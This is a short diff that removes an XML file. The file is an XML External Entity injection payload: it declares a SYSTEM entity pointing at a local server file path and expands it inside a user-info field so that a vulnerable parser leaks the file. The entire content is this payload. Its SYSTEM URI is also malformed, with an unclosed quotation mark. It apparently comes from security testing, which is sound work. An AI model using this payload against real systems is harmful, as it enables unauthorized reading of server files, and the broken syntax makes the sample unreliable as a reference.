@@ -1,6 +1,0 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/oracle/ipc-backend/node_modules/express/lib/router/index.js> ]>
-<userInfo>
-  <firstName>John</firstName>
-  <lastName>&ent;</lastName>
-</userInfo>
